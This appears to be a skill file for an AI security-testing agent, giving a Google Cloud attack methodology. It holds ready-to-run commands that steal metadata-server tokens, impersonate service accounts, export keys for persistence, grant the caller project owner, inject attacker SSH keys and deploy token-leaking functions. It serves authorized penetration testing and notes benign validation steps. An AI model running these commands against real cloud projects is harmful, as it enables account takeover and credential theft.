---
name: gcp
description: Google Cloud Platform security testing - service account impersonation, IAM privilege escalation, metadata server token theft, GCS bucket misconfiguration, and compute/function abuse
---

# GCP Security Testing

Google Cloud's security model is dominated by service accounts and the IAM permissions that let one identity act as another. Almost every privilege escalation path on GCP is a permission that grants control over a service account - the ability to mint its tokens, deploy code that runs as it, or attach it to a new resource. The metadata server on every Compute Engine, GKE, and Cloud Run instance hands out OAuth access tokens for the attached service account to any local process, making it the fastest pivot from code execution to cloud credentials. Tokens are OAuth2 bearer tokens constrained by both IAM permissions and OAuth scopes, so a token is only as powerful as the intersection of the two. For SSRF-mediated metadata token theft, see the ssrf skill.

## Attack Surface

**Scope**
- Cloud IAM (project, folder, organization bindings; service accounts and their keys)
- Metadata server at `metadata.google.internal` / `169.254.169.254` on every instance
- Cloud Storage (GCS) buckets and objects with IAM and legacy ACLs
- Compute Engine (GCE) instances, custom images, startup scripts
- Cloud Functions and Cloud Run services and their runtime service accounts
- Deployment Manager, Cloud Build, and other deploy-as-SA services
- OAuth scopes attached to instances that cap what an SA token can do

**Entry Points**
- Compromised GCE/GKE/Cloud Run workload with an attached service account
- Leaked service account key JSON in repos, CI configs, container images, or buckets
- Publicly readable/writable GCS buckets (`allUsers`, `allAuthenticatedUsers`)
- An identity with a single dangerous IAM permission on a more-privileged SA
- Cloud Build / CI federation (Workload Identity Federation, GitHub OIDC)

**Authentication and identity**
- Service account tokens are short-lived OAuth2 access tokens fetched from the metadata server or minted via the IAM Credentials API
- Service account keys are long-lived JSON files (private key + client_email) usable from anywhere
- Access scopes are an instance-level legacy control that intersects with IAM; a scope-limited token cannot exceed its scopes even with broad IAM
- `gcloud auth print-access-token` and `gcloud config list` reveal the active identity and its token

## Key Vulnerabilities

### Metadata Server Token Theft

Every Google Cloud instance exposes a metadata server that returns an OAuth access token for the attached service account to any process that asks. The request must carry the `Metadata-Flavor: Google` header (which browsers and most SSRF gadgets cannot forge) and targets the `default` (or a named) service account. The token inherits the instance's access scopes; a `cloud-platform`-scoped instance yields a token good for the entire API surface.

**Test:**
```
# Service account access token (note the required header)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Which scopes and SA email back this token
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
# Identity (ID) token with a chosen audience - useful against IAP/Cloud Run
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://example.run.app"
```

### Service Account Impersonation and Keys

`iam.serviceAccounts.getAccessToken` (and `signJwt`, `signBlob`) on a target SA lets an identity mint that SA's tokens directly through the IAM Credentials API without ever holding a key. `iam.serviceAccounts.getOpenIdToken` yields an ID token. The ability to create a key (`iam.serviceAccountKeys.create`) is durable, exportable credential theft.

**Test:**
```
# Enumerate SAs and test impersonation
gcloud iam service-accounts list
gcloud auth print-access-token --impersonate-service-account=<sa>@<proj>.iam.gserviceaccount.com
# Raw IAM Credentials API token mint
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/<sa>@<proj>.iam.gserviceaccount.com:generateAccessToken" \
  -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}'
# Create and download a long-lived key (persistence)
gcloud iam service-accounts keys create key.json --iam-account=<sa>@<proj>.iam.gserviceaccount.com
gcloud auth activate-service-account --key-file=key.json
```

### IAM Privilege Escalation

A long catalog of single permissions escalate to project owner. `iam.serviceAccounts.actAs` plus a deploy permission (create a Function, GCE instance, Cloud Run service, or Deployment Manager config) runs attacker code as a higher-privileged SA. `iam.roles.update` rewrites a custom role you hold; `resourcemanager.projects.setIamPolicy` grants yourself owner; `iam.serviceAccounts.implicitDelegation` chains impersonation across SAs.

**Test:**
```
# Inventory who-can-do-what; testIamPermissions reveals your effective rights
gcloud projects get-iam-policy <proj> --format=json
gcloud iam roles describe roles/owner   # compare against custom roles you can update
# actAs + cloudfunctions.create: deploy a function that runs as a privileged SA
gcloud functions deploy esc --runtime=python311 --trigger-http --allow-unauthenticated \
  --service-account=<priv-sa>@<proj>.iam.gserviceaccount.com --entry-point=h --source=.
# actAs + compute.instances.create: startup script reads the metadata token
gcloud compute instances create esc --zone=us-central1-a \
  --service-account=<priv-sa>@<proj>.iam.gserviceaccount.com --scopes=cloud-platform \
  --metadata=startup-script='curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token > /tmp/t'
# Grant yourself owner (setIamPolicy)
gcloud projects add-iam-policy-binding <proj> --member=user:you@x.com --role=roles/owner
```

### GCS Bucket Misconfiguration

Buckets or objects granting `allUsers` (anyone, unauthenticated) or `allAuthenticatedUsers` (any Google account) are world-readable, and `roles/storage.objectAdmin`/`legacyBucketWriter` on those members is world-writable - an attacker can overwrite served objects, deployment artifacts, or Terraform state. Service account keys and `.env` files routinely sit in misconfigured buckets.

**Test:**
```
# Read bucket IAM and ACLs; allUsers/allAuthenticatedUsers are the red flags
gsutil iam get gs://<bucket>
gsutil ls -r gs://<bucket>/
curl -s "https://storage.googleapis.com/<bucket>/<object>"
# Brute-force globally-unique bucket names (GCPBucketBrute also tests privilege)
python3 gcpbucketbrute.py -k <org-keyword> -u
# Test write access (proves objectAdmin/legacyBucketWriter on allUsers)
echo test | gsutil cp - gs://<bucket>/strix-poc.txt
```

### Compute Engine and Custom Images

Permission to read instance metadata or create/modify instances exposes startup scripts and SSH keys, which often embed secrets. `compute.instances.setMetadata` injects an SSH key for OS Login bypass; reading a custom image or snapshot can recover an entire disk's secrets.

**Test:**
```
gcloud compute instances list
gcloud compute instances describe <vm> --zone=<zone> --format="value(metadata.items)"
# Inject an SSH key via metadata for direct access
gcloud compute instances add-metadata <vm> --zone=<zone> \
  --metadata=ssh-keys="attacker:ssh-rsa AAAA... attacker"
# Enumerate images/snapshots that may hold credentials
gcloud compute images list --no-standard-images
```

### Cloud Functions and Cloud Run

Each function/service runs as a runtime service account (default: the App Engine or Compute default SA, often Editor). Deploy or update rights are RCE as that SA; an unauthenticated HTTP trigger that proxies the metadata server is a public credential leak.

**Test:**
```
gcloud functions list && gcloud run services list
gcloud functions describe <fn> --format="value(serviceAccountEmail)"
# Deploy a function that returns its own SA token over HTTP
gcloud functions deploy leak --runtime=python311 --trigger-http --allow-unauthenticated \
  --entry-point=h --source=.
curl -s "https://<region>-<proj>.cloudfunctions.net/leak"
```

## Bypass Techniques

**Scope vs IAM intersection**
- A token from a `storage-ro`-scoped instance cannot write even if the SA has Editor - check scopes before assuming a permission works
- Impersonation via the IAM Credentials API lets you request `cloud-platform` scope explicitly, bypassing the limited instance scopes

**Impersonation chaining**
- `getAccessToken` on SA-A, which itself has `getAccessToken` on SA-B, walks a chain to a privileged target
- `implicitDelegation` formalizes multi-hop impersonation; `signJwt` forges a self-signed assertion to exchange for any scope

**Default service account abuse**
- The Compute/App Engine default SA is frequently left with project Editor; any workload using it inherits near-total project control
- Functions and Cloud Build default to these SAs unless overridden - deploying code is often Editor-equivalent RCE

## Testing Methodology

1. **Identify the identity** - `gcloud config list`, `gcloud auth print-access-token`, decode the token's scopes via the metadata `scopes` endpoint
2. **Pull the metadata token** - on any compromised compute, fetch the SA token and its scopes from `metadata.google.internal`
3. **Enumerate IAM** - `get-iam-policy` at project/folder/org; list service accounts and existing key counts
4. **Find escalation permissions** - look for `actAs`, `getAccessToken`/`signJwt`, `setIamPolicy`, `roles.update`, and deploy permissions
5. **Sweep storage** - GCPBucketBrute for guessable names; test `allUsers`/`allAuthenticatedUsers` read and write
6. **Test impersonation** - `--impersonate-service-account` and the generateAccessToken API against higher-priv SAs
7. **Achieve code execution** - deploy a Function/Cloud Run/GCE startup script as a privileged SA, then re-pull its token
8. **Persist** - create an exportable SA key or self-bind a privileged role
9. **Map the graph** - record edges (who can impersonate/actAs whom) to find the shortest path to project owner

## Validation

1. Decode the captured token (`tokeninfo` endpoint) to confirm its scopes and bound SA before claiming access
2. Make one read-only call (`gcloud projects describe`, `gsutil ls`) to prove the token/identity is live
3. For escalation permissions, show `testIamPermissions` or the role definition lists the dangerous permission - avoid actually granting owner in production
4. For buckets, show anonymous read returning real content and, for write, upload a single benign marker object you then delete
5. For deploy-based RCE, return a benign command's output or the SA token rather than mutating production resources

## False Positives

- Metadata server reachable but returning a token with scopes restricted to `userinfo.email`/`storage-ro` - narrow, not full control
- A service account with broad IAM but attached to an instance whose access scopes cap it to read-only
- Bucket listing `allUsers` but only on objects intended to be public (static website assets, public datasets)
- `actAs`/impersonation permission granted on an SA that has no privileges itself
- Custom role containing a scary permission name that is not actually bound to your principal at the relevant resource level

## Impact

- Project takeover via `actAs` + deploy, `setIamPolicy` self-grant, or default-SA Editor inheritance
- Organization-wide compromise when escalation lands on an org-level admin or a folder-spanning SA
- Long-lived credential theft through exported service account keys that survive token expiry
- Data exfiltration from world-readable GCS buckets (backups, keys, PII) and modification of served artifacts
- Code execution as privileged service accounts via Functions, Cloud Run, GCE startup scripts, and Cloud Build
- Lateral movement across projects through cross-project SA bindings and impersonation chains

## Pro Tips

1. Check the instance access scopes before trusting an SA token - scopes silently cap a token regardless of IAM breadth
2. Prefer impersonation (`generateAccessToken` with explicit `cloud-platform`) over instance tokens to escape narrow scopes
3. The Compute/App Engine default SA with Editor is the most common single misconfiguration - any workload on it is near-owner
4. `iam.serviceAccounts.actAs` is the keystone permission; pair it with any create permission for code execution as a better SA
5. GCS bucket names are global and guessable - GCPBucketBrute against the org keyword routinely finds open backup buckets
6. ID tokens from the metadata `identity?audience=` endpoint defeat IAP and Cloud Run auth when the audience matches the target
7. Enumerate existing SA keys (`gcloud iam service-accounts keys list`) - a forgotten exported key is cleaner than minting a new one
8. `gcloud --impersonate-service-account` works transparently across most commands, so test the full chain, not just the token call
9. Cloud Build's default SA is highly privileged; a poisoned build trigger or `cloudbuild.yaml` is RCE as that SA

## Summary

GCP escalation is a graph of service-account control: a metadata token or leaked key gives initial identity, a single permission (`actAs` + deploy, `getAccessToken`/`signJwt`, `setIamPolicy`, or `roles.update`) converts it into code execution or self-granted ownership, and the Editor-by-default service accounts make many footholds owner-equivalent already. Always check scopes against IAM, prefer impersonation to bypass narrow instance scopes, sweep GCS for the credentials that restart the chain, and map who-can-act-as-whom to find the shortest path to project owner. Exported SA keys and self-bound roles are the durable persistence the obvious cleanup misses.
